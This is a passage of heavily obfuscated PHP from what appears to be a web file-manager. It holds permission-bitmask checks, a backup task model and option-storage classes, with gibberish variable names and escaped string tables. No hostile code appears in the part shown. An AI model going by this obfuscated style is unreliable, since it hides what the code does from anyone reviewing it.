self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1988]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1989], $ƒÑ®Ö±ú[1975] => 7, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => 0)); return $·¤®ö¬¨; } public static function authCheck($™Ê¢—Æ’, $İ³ŸøĞÁ) { $®öœ€Ÿ¹ =& $_SERVER[Š—Â“œÔ]; $™Ê¢—Æ’ = intval($™Ê¢—Æ’); if (KodUser::isRoot() && $GLOBALS[$®öœ€Ÿ¹[6]][$®öœ€Ÿ¹[1990]]) { return !0; } if ($™Ê¢—Æ’ <= 0) { return !1; } if (($™Ê¢—Æ’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($™Ê¢—Æ’ & $İ³ŸøĞÁ); } public static function authCheckShow($ğ÷£¡ŒÑ) { return self::authCheck($ğ÷£¡ŒÑ, self::AUTH_SHOW); } public static function authCheckView($ ³Ç¸ˆ) { return self::authCheck($ ³Ç¸ˆ, self::AUTH_VIEW); } public static function authCheckDownload($À»Ñï·) { return self::authCheck($À»Ñï·, self::AUTH_DOWNLOAD); } public static function authCheckUpload($âÁµÉ‘ù) { return self::authCheck($âÁµÉ‘ù, self::AUTH_UPLOAD); } public static function authCheckEdit($ñ’êŠ¬ã) { return self::authCheck($ñ’êŠ¬ã, self::AUTH_EDIT); } public static function authCheckRemove($Úå½Â­‘) { return self::authCheck($Úå½Â­‘, self::AUTH_REMOVE); } public static function authCheckShare($”œŸ…Ÿ‚) { return self::authCheck($”œŸ…Ÿ‚, self::AUTH_SHARE); } public static function authCheckComment($ı—å‘úÍ) { return self::authCheck($ı—å‘úÍ, self::AUTH_COMMENT); } public static function authCheckEvent($­ ş„Åç) { return self::authCheck($­ ş„Åç, self::AUTH_EVENT); } public static function authCheckRoot($—ìø˜š¨) { return self::authCheck($—ìø˜š¨, self::AUTH_ROOT); } public static function authCheckAction($ÑÒ®¸Æ, $ëãä®) { $ïªêâÓõ =& $_SERVER[Š—Â“œÔ]; $•İì« = array($ïªêâÓõ[1991] => self::AUTH_VIEW, $ïªêâÓõ[1276] => self::AUTH_DOWNLOAD, $ïªêâÓõ[110] => self::AUTH_UPLOAD, $ïªêâÓõ[1940] => self::AUTH_EDIT, $ïªêâÓõ[1939] => self::AUTH_REMOVE, $ïªêâÓõ[1950] => self::AUTH_SHARE, $ïªêâÓõ[431] => self::AUTH_COMMENT, $ïªêâÓõ[1757] => self::AUTH_EVENT, $ïªêâÓõ[1992] => self::AUTH_ROOT); if (!isset($•İì«[$ëãä®])) { return; } $õ€ªòÃ‰ = $•İì«[$ëãä®]; $ÑÒ®¸Æ = intval($ÑÒ®¸Æ); if ($ÑÒ®¸Æ <= 0) { return !1; } if (($ÑÒ®¸Æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÑÒ®¸Æ & $õ€ªòÃ‰); } public static function authDisable($âËÆ¸Ë£, $ßùÉÀü) { if (intval($âËÆ¸Ë£) <= 0) { return 0; } return intval($âËÆ¸Ë£) & ~$ßùÉÀü; } public $optionType = "\123\x79\x73\x74\x65\x6d\56\163\x6f\x75\162\x63\145\x41\x75\x74\150\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\150", "\x6c\141\x62\x65\154", "\144\x69\163\x70\154\x61\x79", "\x73\x79\x73\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $åé±„‘­ = $this->authDefault(); foreach ($åé±„‘­ as $ìÁ¸ïÁ¢) { $this->add($ìÁ¸ïÁ¢); } } public function findAuth($¾¿Çíµ¿, $ÓáˆÑœé) { $â‚–Ë´• =& $_SERVER[Š—Â“œÔ]; $Èç‚íÀ = parent::listData(); foreach ($Èç‚íÀ as $ÇÖ±ƒè—) { $…ºúãÙØ = intval($ÇÖ±ƒè—[$â‚–Ë´•[489]]); if ($…ºúãÙØ <= 0 || $ÇÖ±ƒè—[$â‚–Ë´•[1993]] == 0) { continue; } if (($…ºúãÙØ & $¾¿Çíµ¿) != $¾¿Çíµ¿) { continue; } if (($…ºúãÙØ & $ÓáˆÑœé) != 0) { continue; } return $ÇÖ±ƒè—[$â‚–Ë´•[477]]; } return !1; } public function findAuthMax($±š“ Í, $ùÂª¸…è) { $ÂìÖ¤Ç¢ =& $_SERVER[Š—Â“œÔ]; $éÔæ ×Ó = !1; $™ïÊşä® = parent::listData(); foreach ($™ïÊşä® as $İ¦šÍ«Ñ) { $ì¢„òçİ = intval($İ¦šÍ«Ñ[$ÂìÖ¤Ç¢[489]]); if ($ì¢„òçİ <= 0 || $İ¦šÍ«Ñ[$ÂìÖ¤Ç¢[1993]] == 0) { continue; } if (($ì¢„òçİ & $±š“ Í) != $±š“ Í) { continue; } if (($ì¢„òçİ & $ùÂª¸…è) != 0) { continue; } if (!$éÔæ ×Ó) { $éÔæ ×Ó = $İ¦šÍ«Ñ; continue; } if (intval($éÔæ ×Ó[$ÂìÖ¤Ç¢[489]]) < $ì¢„òçİ) { $éÔæ ×Ó = $İ¦šÍ«Ñ; } } return $éÔæ ×Ó ? $éÔæ ×Ó[$ÂìÖ¤Ç¢[477]] : !1; } public function findAuthReadOnly() { $ƒ“ë¼æ× = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¡¿Éì™è = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ƒ“ë¼æ×, $¡¿Éì™è); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $½¬ôÀëÚ =& $_SERVER[Š—Â“œÔ]; $´ÎÖâİñ = parent::listData(); $ Ñõè = !1; foreach ($´ÎÖâİñ as $¶Ë§Ø ) { if ($¶Ë§Ø [$½¬ôÀëÚ[489]] <= 0 || $¶Ë§Ø [$½¬ôÀëÚ[1993]] == $½¬ôÀëÚ[230]) { continue; } if (!$ Ñõè) { $ Ñõè = $¶Ë§Ø ; continue; } if ($ Ñõè[$½¬ôÀëÚ[489]] > $¶Ë§Ø [$½¬ôÀëÚ[489]]) { $ Ñõè = $¶Ë§Ø ; } } return $ Ñõè ? $ Ñõè[$½¬ôÀëÚ[477]] : $½¬ôÀëÚ[12]; } public function listData($Ğå˜ËÏ = false, $™ç¶§È‰ = "\163\x6f\x72\x74", $âÔÉ¹åÉ = false) { return parent::listData($Ğå˜ËÏ, $™ç¶§È‰, $âÔÉ¹åÉ); } public function update($¥ÑÅ€ŠÎ, $Ü×¥Ëø) { $”µÃ…Ğç =& $_SERVER[Š—Â“œÔ]; $¢­§®ñ‘ = parent::listData($¥ÑÅ€ŠÎ); $Öè¿¬è = $this->findByName($Ü×¥Ëø[$”µÃ…Ğç[32]]); if (!$¢­§®ñ‘ || $Öè¿¬è && $Öè¿¬è[$”µÃ…Ğç[477]] != $¢­§®ñ‘[$”µÃ…Ğç[477]]) { return !1; } $this->filterAuth($Ü×¥Ëø[$”µÃ…Ğç[489]]); return parent::update($¥ÑÅ€ŠÎ, $Ü×¥Ëø); } public function remove($Å ş„Ë£) { $–‘‚Ù = parent::listData($Å ş„Ë£); if (!$–‘‚Ù || $–‘‚Ù[$_SERVER[Š—Â“œÔ][191]]) { return !1; } return parent::remove($Å ş„Ë£); } public function add($†£õëò« = array()) { $©›Õ‚ñ® =& $_SERVER[Š—Â“œÔ]; if ($this->findByName($†£õëò«[$©›Õ‚ñ®[32]])) { return !1; } $©¬ÊîÖ× = array($©›Õ‚ñ®[32] => $©›Õ‚ñ®[12], $©›Õ‚ñ®[489] => 1, $©›Õ‚ñ®[1994] => $©›Õ‚ñ®[1981], $©›Õ‚ñ®[1993] => 1, $©›Õ‚ñ®[191] => 0, $©›Õ‚ñ®[1995] => 0); $†£õëò« = array_merge($©¬ÊîÖ×, $†£õëò«); $†£õëò«[$©›Õ‚ñ®[1995]] = $this->getSort(); $this->filterAuth($†£õëò«[$©›Õ‚ñ®[489]]); return parent::insert($†£õëò«); } private function getSort() { $·ìÆ¡¥ã =& $_SERVER[Š—Â“œÔ]; $ÚíÃ½— = parent::listData(); $²¿í°ñ = array_to_keyvalue($ÚíÃ½—, $·ìÆ¡¥ã[12], $·ìÆ¡¥ã[1995]); return empty($²¿í°ñ) ? 0 : max($²¿í°ñ) + 1; } private function filterAuth(&$é±Ù˜ÓŒ) { if (!$é±Ù˜ÓŒ) { return; } $şû‡®ş§ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ª©âø¬ = array(); foreach ($şû‡®ş§ as $½ŠÙ—ªÅ) { if ($é±Ù˜ÓŒ & $½ŠÙ—ªÅ) { $ª©âø¬[] = $½ŠÙ—ªÅ; } } if (in_array(self::AUTH_ROOT, $ª©âø¬)) { $é±Ù˜ÓŒ = array_sum($şû‡®ş§); return; } $œø©òÒ¤ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ª©âø¬ as $½ŠÙ—ªÅ) { if (isset($œø©òÒ¤[$½ŠÙ—ªÅ])) { $ª©âø¬ = array_merge($ª©âø¬, $œø©òÒ¤[$½ŠÙ—ªÅ]); } } $ª©âø¬[] = self::AUTH_SHOW; $é±Ù˜ÓŒ = array_sum(array_unique($ª©âø¬)); } public function sort($Êí”ßâ¯, $‚‡ßÖ¢è) { return parent::update($Êí”ßâ¯, $‚‡ßÖ¢è); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\142\x61\143\153\x75\x70\x4c\151\x73\164"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\x73\x74\141\164\165\163", "\143\x6f\x6e\x74\145\x6e\164", "\x6d\141\156\x75\141\x6c", "\162\145\163\165\x6c\164", "\x74\x69\x6d\x65\x46\x72\157\155", "\x74\151\155\145\x54\157"); public function config() { $ß±ÎçÎÀ =& $_SERVER[Š—Â“œÔ]; Action($ß±ÎçÎÀ[1996])->taskInit(); $ÌÃÑ†Ã = Model($ß±ÎçÎÀ[837])->get($ß±ÎçÎÀ[851]); $ÌÃÑ†Ã = json_decode($ÌÃÑ†Ã, !0); $ÌÃÑ†Ã = is_array($ÌÃÑ†Ã) ? $ÌÃÑ†Ã : array(); $this->parseContent($ÌÃÑ†Ã); unset($ÌÃÑ†Ã[$ß±ÎçÎÀ[1739]]); Model($ß±ÎçÎÀ[1738])->cacheClear(); $­™ğí×÷ = $ß±ÎçÎÀ[1997]; $ßÁ±Šíº = Model($ß±ÎçÎÀ[1998])->findByKey($ß±ÎçÎÀ[1757], $­™ğí×÷); if (!$ßÁ±Šíº) { $ßÁ±Šíº = array(); } if (isset($ßÁ±Šíº[$ß±ÎçÎÀ[206]])) { $ßÁ±Šíº[$ß±ÎçÎÀ[206]] = json_decode($ßÁ±Šíº[$ß±ÎçÎÀ[206]], !0); } if (isset($ÌÃÑ†Ã[$ß±ÎçÎÀ[206]])) { $ßÁ±Šíº[$ß±ÎçÎÀ[206]][$ß±ÎçÎÀ[1742]] = $ÌÃÑ†Ã[$ß±ÎçÎÀ[206]]; unset($ÌÃÑ†Ã[$ß±ÎçÎÀ[206]]); } return array_merge($ßÁ±Šíº, $ÌÃÑ†Ã); } public function listData($•ö»ÔÏ¹ = false, $Ù•Ö = "\x6d\x6f\144\151\146\x79\x54\x69\x6d\x65", $ºóÈ±¾ = false) { $„ò»öñ = parent::listData($•ö»ÔÏ¹, $Ù•Ö, !0); if (!$„ò»öñ) { return $„ò»öñ; } if ($•ö»ÔÏ¹) { $„ò»öñ = array($„ò»öñ); } foreach ($„ò»öñ as &$Şæ¸óÍ) { $this->parseContent($Şæ¸óÍ); } return $•ö»ÔÏ¹ ? $„ò»öñ[0] : $„ò»öñ; } public function parseContent(&$õîÓ¹) { $¹ÈúÙ¯¤ =& $_SERVER[Š—Â“œÔ]; $»û¿›±ç = _get($õîÓ¹, $¹ÈúÙ¯¤[171], $¹ÈúÙ¯¤[91]); if (!in_array($»û¿›±ç, array($¹ÈúÙ¯¤[843], $¹ÈúÙ¯¤[1206]))) { $õîÓ¹[$¹ÈúÙ¯¤[171]] = $»û¿›±ç == $¹ÈúÙ¯¤[91] ? $¹ÈúÙ¯¤[1206] : $¹ÈúÙ¯¤[843]; } } public function lastItem() { $„œÜåÈ = $this->listData(); return !empty($„œÜåÈ[0]) ? $„œÜåÈ[0] : null; } public function kill($äõ“†áÕ) { $Üµ¶™ãÜ =& $_SERVER[Š—Â“œÔ]; $«Ÿ«å®û = $this->listData($äõ“†áÕ); if (!$«Ÿ«å®û || empty($«Ÿ«å®û[$Üµ¶™ãÜ[32]])) { return !0; } Task::kill($Üµ¶™ãÜ[850]); Task::kill($Üµ¶™ãÜ[868]); Task::kill($Üµ¶™ãÜ[877]); $·Ëˆü•Ğ = $«Ÿ«å®û[$Üµ¶™ãÜ[32]]; $£Ç…ïÉ˜ = TEMP_FILES . $Üµ¶™ãÜ[846] . $·Ëˆü•Ğ . $Üµ¶™ãÜ[8]; IO::remove($£Ç…ïÉ˜, !1); return $this->remove($äõ“†áÕ); } public function remove($ ¡¢äû«) { $ÍÂ÷öÚˆ = $this->listData($ ¡¢äû«); if (!$ÍÂ÷öÚˆ) { return !0; } return $this->backupRemove($ÍÂ÷öÚˆ); } private function backupRemove($¯µ™áÑÈ) { parent::remove($¯µ™áÑÈ[$_SERVER[Š—Â“œÔ][477]]); $¦…ÍÅøÈ = $this->backupPath($¯µ™áÑÈ); IO::remove($¦…ÍÅøÈ, !1); return !0; } private function backupPath($Àïƒå„ú) { $±öë—‘ =& $_SERVER[Š—Â“œÔ]; $ˆ¾Çë‘ = $Àïƒå„ú[$±öë—‘[32]]; $³‹¥ğä = Model($±öë—‘[837])->get($±öë—‘[838]); $ŞŠ¸æ¸ = substr(md5($±öë—‘[839] . $³‹¥ğä . $ˆ¾Çë‘), 0, 8); return "\x7b\151\157\x3a{$Àïƒå„ú[$±öë—‘[819]]}\175\x2f\x64\x61\164\141\142\x61\163\145\x2f\x62\141\143\x6b\x75\x70\x2f" . $ˆ¾Çë‘ . $±öë—‘[11] . $ŞŠ¸æ¸; } public function start() { $Ïú–™â¾ =& $_SERVER[Š—Â“œÔ]; if ($GLOBALS[$Ïú–™â¾[6]][$Ïú–™â¾[92]][$Ïú–™â¾[1999]] != $Ïú–™â¾[91]) { return !0; } $¨“ı·» = $this->config(); if (!$¨“ı·» || $¨“ı·»[$Ïú–™â¾[1739]] != $Ïú–™â¾[91]) { return !1; } if ($¨“ı·»[$Ïú–™â¾[171]] == $Ïú–™â¾[843]) { $‹Õ€ãÚì = Model($Ïú–™â¾[837])->get($Ïú–™â¾[1322]); if ($‹Õ€ãÚì == $Ïú–™â¾[1323]) { $¨“ı·»[$Ïú–™â¾[171]] = $Ïú–™â¾[1206]; } } $å‘ô“’ó = $this->process(); foreach ($å‘ô“’ó as $¡ş²Ëş˜) { if ($¡ş²Ëş˜) { return Task::restart($¡ş²Ëş˜[$Ïú–™â¾[477]]); } } $÷åñŸöÁ = new Backup(); $í²ì¤™ = $÷åñŸöÁ->db(); if ($í²ì¤™) { $í²ì¤™ = $÷åñŸöÁ->dbFile(); if ($í²ì¤™ && $¨“ı·»[$Ïú–™â¾[171]] == $Ïú–™â¾[843]) { $í²ì¤™ = $÷åñŸöÁ->file(); } } Backup::set(array($Ïú–™â¾[817] => 1, $Ïú–™â¾[828] => time())); return !0; } public function process() { $ìú©øºÔ =& $_SERVER[Š—Â“œÔ]; $‹Ä¬Ê¶¡ = array($ìú©øºÔ[824] => Task::get($ìú©øºÔ[850]), $ìú©øºÔ[829] => Task::get($ìú©øºÔ[868]), $ìú©øºÔ[232] => Task::get($ìú©øºÔ[877])); $Ãî´áÅş = !1; foreach ($‹Ä¬Ê¶¡ as &$°ß¢¸Â›) { if ($Ãî´áÅş) { $°ß¢¸Â› = !1; continue; } if ($°ß¢¸Â›) { $ñÀÈäø  = intval(_get($°ß¢¸Â›, $ìú©øºÔ[1775], 0)); if (time() - $ñÀÈäø  > 7200) { Task::kill($°ß¢¸Â›[$ìú©øºÔ[477]]); $Ãî´áÅş = !0; $°ß¢¸Â› = !1; } } } return $‹Ä¬Ê¶¡; } public function restore() { $æÈôÖ =& $_SERVER[Š—Â“œÔ]; ActionCall($æÈôÖ[1134], !0, 1); ActionCall($æÈôÖ[1134], !0, 0); } } goto b£Å£¼î‘Ü; BòÎ¼â‘ó: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array(); public function listData($•ßü‘•» = false, $ØòµŸ†ü = "\x6d\157\x64\x69\146\x79\x54\x69\x6d\x65", $àş¾² = false) { $ç£ó™õì = Model($this->modelType)->get(!1, $this->optionType, !0); $ì÷•Ñ†é = array_values($ç£ó™õì); if ($ì÷•Ñ†é && $ì÷•Ñ†é[0] && !is_array($ì÷•Ñ†é[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ç£ó™õì = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ç£ó™õì) { return $•ßü‘•» ? null : array(); } if (!$•ßü‘•») { $ç£ó™õì = array_filter(array_values($ç£ó™õì)); return array_sort_by($ç£ó™õì, $ØòµŸ†ü, $àş¾²); } return $ç£ó™õì[$_SERVER[Š—Â“œÔ][474] . $•ßü‘•»]; } public function insert($ääÂ´ÏÖ) { $Ç÷ƒİóÃ =& $_SERVER[Š—Â“œÔ]; $ääÂ´ÏÖ = array_field_key($ääÂ´ÏÖ, $this->field); $­¬ì£À¡ = Model($this->modelType)->get($Ç÷ƒİóÃ[475], $this->optionType . $Ç÷ƒİóÃ[476]); $­¬ì£À¡ = $­¬ì£À¡ ? $­¬ì£À¡ : 0; $ääÂ´ÏÖ[$Ç÷ƒİóÃ[477]] = ++$­¬ì£À¡; $ääÂ´ÏÖ[$Ç÷ƒİóÃ[233]] = time(); $ääÂ´ÏÖ[$Ç÷ƒİóÃ[88]] = time(); Model($this->modelType)->set($Ç÷ƒİóÃ[475], $­¬ì£À¡, $this->optionType . $Ç÷ƒİóÃ[476]); Model($this->modelType)->set($Ç÷ƒİóÃ[474] . $­¬ì£À¡, $ääÂ´ÏÖ, $this->optionType); return $­¬ì£À¡; } public function update($ıŠ«…‹Í, $»†äßºŒ) { $Íå˜‹íÜ =& $_SERVER[Š—Â“œÔ]; $»†äßºŒ = array_field_key($»†äßºŒ, $this->field); $Í´Íö‡î = $this->listData($ıŠ«…‹Í); if (!$Í´Íö‡î || !$ıŠ«…‹Í) { return !1; } $»†äßºŒ = array_merge($Í´Íö‡î, $»†äßºŒ); $»†äßºŒ[$Íå˜‹íÜ[88]] = time(); return Model($this->modelType)->set($Íå˜‹íÜ[474] . $ıŠ«…‹Í, $»†äßºŒ, $this->optionType); } public function remove($ßïóˆŒÅ) { if (!$ßïóˆŒÅ) { return !1; } return Model($this->modelType)->remove($_SERVER[Š—Â“œÔ][474] . $ßïóˆŒÅ, $this->optionType); } public function clear() { $ƒèÔÎö­ =& $_SERVER[Š—Â“œÔ]; Model($this->modelType)->remove($ƒèÔÎö­[475], $this->optionType . $ƒèÔÎö­[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($©ªÕÊ­, $Îâîé‡È) { if (!$Îâîé‡È) { return !1; } $ß•ïíşÉ = $this->listData(); $ß•ïíşÉ = array_to_keyvalue($ß•ïíşÉ, $©ªÕÊ­); return isset($ß•ïíşÉ[$Îâîé‡È]) ? $ß•ïíşÉ[$Îâîé‡È] : !1; } public function findByName($ñĞÈ¾¡Ñ) { return $this->findByKey($_SERVER[Š—Â“œÔ][32], $ñĞÈ¾¡Ñ); } protected function resetData($ëÛ‡ÙÊŸ) { $æâ‘°˜Ï =& $_SERVER[Š—Â“œÔ]; $ëÛ‡ÙÊŸ = is_array($ëÛ‡ÙÊŸ) ? $ëÛ‡ÙÊŸ : array(); $Çó›‚ËÔ = array(); for ($Œ­Äµ“µ = 0; $Œ­Äµ“µ < count($ëÛ‡ÙÊŸ); $Œ­Äµ“µ++) { $Çó›‚ËÔ[$æâ‘°˜Ï[474] . $ëÛ‡ÙÊŸ[$Œ­Äµ“µ][$æâ‘°˜Ï[477]]] = $ëÛ‡ÙÊŸ[$Œ­Äµ“µ]; } return Model($this->modelType)->set($Çó›‚ËÔ, !1, $this->optionType); } private function getAutoName($×ÉáŒ¸¸) { $Ì´Ï½íë = array_to_keyvalue($this->listData(), $_SERVER[Š—Â“œÔ][32]); if (!$Ì´Ï½íë || !isset($Ì´Ï½íë[$×ÉáŒ¸¸])) { return $×ÉáŒ¸¸; } for ($ÅşÈˆô = 1; $ÅşÈˆô < count($Ì´Ï½íë); $ÅşÈˆô++) { $ŞÀïñ­â = $×ÉáŒ¸¸ . "\x28{$ÅşÈˆô}\51"; if (!isset($Ì´Ï½íë[$ŞÀïñ­â])) { return $ŞÀïñ­â; } } return $ŞÀïñ­â; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($—î‚İ…ı = false, $œÊ¦¿ = '', $æ™èÑµ£ = false) { $·Œãæ’Š =& $_SERVER[Š—Â“œÔ]; $ƒ†ûĞ¥ï = $this->cacheGet($œÊ¦¿); $ÎÀÌ¥ä = $this->optionDefault($œÊ¦¿); $ÎÀÌ¥ä = is_array($ÎÀÌ¥ä) ? $ÎÀÌ¥ä : array(); if (is_array($ƒ†ûĞ¥ï)) { $ƒ†ûĞ¥ï = array_merge($ÎÀÌ¥ä, $ƒ†ûĞ¥ï); return $—î‚İ…ı ? isset($ƒ†ûĞ¥ï[$—î‚İ…ı]) ? $ƒ†ûĞ¥ï[$—î‚İ…ı] : null : $ƒ†ûĞ¥ï; } $»Åæí = $this->filterWhere(array($·Œãæ’Š[33] => $œÊ¦¿)); $ƒ†ûĞ¥ï = $this->where($»Åæí)->select(); $ƒ†ûĞ¥ï = array_to_keyvalue($ƒ†ûĞ¥ï, $·Œãæ’Š[97], $·Œãæ’Š[452]); foreach ($ƒ†ûĞ¥ï as $±³­å½í => $Ò‘¡ôÚ) { if ($æ™èÑµ£ || in_array($±³­å½í, $this->jsonField)) { $ƒ†ûĞ¥ï[$±³­å½í] = json_decode($Ò‘¡ôÚ, !0); } } $this->cacheSet($œÊ¦¿, $ƒ†ûĞ¥ï); $ƒ†ûĞ¥ï = array_merge($ÎÀÌ¥ä, $ƒ†ûĞ¥ï); return $—î‚İ…ı ? $ƒ†ûĞ¥ï[$—î‚İ…ı] : $ƒ†ûĞ¥ï; } public function set($–ï¾”‘, $Åß¸˜±Å = false, $œóƒº®ù = '') { $ãÂÏ‡¬Ä =& $_SERVER[Š—Â“œÔ]; $this->cacheRemove($œóƒº®ù); $Öİ›œá• = array(); $·Ù–›é = is_array($–ï¾”‘) ? $–ï¾”‘ : array($–ï¾”‘ => $Åß¸˜±Å); foreach ($·Ù–›é as $•¶©ï => $¥óÛôˆ) { if (is_array($¥óÛôˆ)) { $¥óÛôˆ = json_encode_force($¥óÛôˆ); } $this->checkLength($¥óÛôˆ, !1, $this->tableName . $ãÂÏ‡¬Ä[4] . $–ï¾”‘); $¥óÛôˆ = self::textEncode($¥óÛôˆ); $·Ù–›é = array($ãÂÏ‡¬Ä[33] => $œóƒº®ù, $ãÂÏ‡¬Ä[97] => $•¶©ï, $ãÂÏ‡¬Ä[452] => $¥óÛôˆ); $Öİ›œá•[] = $this->filterWhere($·Ù–›é); } if (!$Öİ›œá•) { return !0; } $˜‘¼«‚Ğ = $this->cacheKey($ãÂÏ‡¬Ä[478]); CacheLock::lock($˜‘¼«‚Ğ); $½õ°®¦¢ = $this->addAll($Öİ›œá•, array(), !0); CacheLock::unlock($˜‘¼«‚Ğ); return $½õ°®¦¢; } protected function optionDefault($ÌÑ£ûœ® = '') { return !1; } public function setDeep($Ì¿‘è÷, $ù“¦Éà· = false, $Ÿ½ÔÓšÊ = '') { $å¤å£äß = explode($_SERVER[Š—Â“œÔ][10], $Ì¿‘è÷); $¶ ÑêÒ = $this->get(); array_set_value($¶ ÑêÒ, $Ì¿‘è÷, $ù“¦Éà·); $this->set($å¤å£äß[0], $¶ ÑêÒ[$å¤å£äß[0]], $Ÿ½ÔÓšÊ); } public function remove($‹ƒìÁãñ, $ØÔäı±û = '') { $”¬Ğ½†Ë =& $_SERVER[Š—Â“œÔ]; $this->cacheRemove($ØÔäı±û); $½ïàüÙñ = $this->filterWhere(array($”¬Ğ½†Ë[97] => $‹ƒìÁãñ, $”¬Ğ½†Ë[33] => $ØÔäı±û)); if (is_null($‹ƒìÁãñ)) { unset($½ïàüÙñ[$”¬Ğ½†Ë[97]]); } return $this->where($½ïàüÙñ)->delete(); } public function cacheSet($ñä€¥Ò, $–¤±ãÎİ = false) { return Cache::set($this->cacheKey($ñä€¥Ò), $–¤±ãÎİ); } public function cacheGet($«–¸¦) { return Cache::get($this->cacheKey($«–¸¦)); } public function cacheRemove($ıâøŒë”) { return Cache::remove($this->cacheKey($ıâøŒë”)); } protected function filterWhere($ÌíÁšˆÆ) { return $ÌíÁšˆÆ; } protected function cacheKey($¯òø©Ó¶) { return $¯òø©Ó¶; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\155\145" => "\x69\x6f\x5f\163\x6f\165\x72\143\145\x5f\155\x65\164\x61", "\x6d\x65\164\x61\x46\x69\x65\154\x64" => "\163\157\165\162\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\155\145", "\164\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\165\156\x63\164\x69\x6f\156"), array("\x63\162\145\141\164\x65\124\x69\x6d\145", "\x74\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\165\156\143\x74\151\157\156"), array("\166\x69\145\x77\124\x69\155\145", "\164\151\155\145", "\151\156\163\x65\162\x74", "\x66\x75\x6e\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($“ñÎ†ğ¦) { return $this->listSource(array($_SERVER[Š—Â“œÔ][479] => $“ñÎ†ğ¦)); } public function typeName($»±”Ä×Ğ) { static $íÛó–ü¦ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\147\162\157\x75\160"); return $íÛó–ü¦[$»±”Ä×Ğ . $_SERVER[Š—Â“œÔ][12]]; } public function sourceListInfo($äØ¸í», $¦¾Šì£ = false) { $¼§÷² =& $_SERVER[Š—Â“œÔ]; $äØ¸í» = $äØ¸í» ? $äØ¸í» : array(); $äØ¸í» = array_filter(array_unique($äØ¸í»)); if (!$äØ¸í») { return array(); } $¥—ç–ë† = $this->where(array($¼§÷²[193] => array($¼§÷²[7], $äØ¸í»)))->select(); $this->_listDataApply($¥—ç–ë†, $¦¾Šì£); return array_to_keyvalue($¥—ç–ë†, $¼§÷²[193]); } public function pathInfoFilter(&$Ü—èŸªÜ) { $ƒ²¿Î«í =& $_SERVER[Š—Â“œÔ]; static $†äî‹¤Á = false; static $é›Á®Æ¦ = false; static $ê®˜Ùã = false; if (!$†äî‹¤Á) { $¿°ùŠ¸ö = $ƒ²¿Î«í[480]; $¿°ùŠ¸ö .= $ƒ²¿Î«í[481]; $¿°ùŠ¸ö .= $ƒ²¿Î«í[482]; $®€ÓæÕ§ = $ƒ²¿Î«í[483]; $™±Ïòšœ = explode($ƒ²¿Î«í[50], $®€ÓæÕ§); $†äî‹¤Á = explode($ƒ²¿Î«í[50], $¿°ùŠ¸ö); $é›Á®Æ¦ = array(); foreach ($†äî‹¤Á as $÷æ£Ò¬É) { if (in_array($÷æ£Ò¬É, $™±Ïòšœ)) { continue; } $é›Á®Æ¦[] = $÷æ£Ò¬É; } $ê®˜Ùã = explode($ƒ²¿Î«í[50], $ƒ²¿Î«í[484]); } foreach ($ê®˜Ùã as $«ÇÕˆ›ª) { if (isset($Ü—èŸªÜ[$«ÇÕˆ›ª])) { $Ü—èŸªÜ[$«ÇÕˆ›ª] = intval($Ü—èŸªÜ[$«ÇÕˆ›ª]); } } $Ü—èŸªÜ[$ƒ²¿Î«í[87]] = $ƒ²¿Î«í[485] . $Ü—èŸªÜ[$ƒ²¿Î«í[193]] . $ƒ²¿Î«í[486]; $Ü—èŸªÜ[$ƒ²¿Î«í[33]] = $Ü—èŸªÜ[$ƒ²¿Î«í[487]] == 1 ? $ƒ²¿Î«í[78] : $ƒ²¿Î«í[232]; $Ü—èŸªÜ[$ƒ²¿Î«í[190]] = $this->typeName($Ü—èŸªÜ[$ƒ²¿Î«í[190]]); if ($Ü—èŸªÜ[$ƒ²¿Î«í[487]] != 1) { $Ü—èŸªÜ[$ƒ²¿Î«í[169]] = $Ü—èŸªÜ[$ƒ²¿Î«í[488]]; unset($Ü—èŸªÜ[$ƒ²¿Î«í[488]]); } $îâ¹œÃ¤ = $†äî‹¤Á; 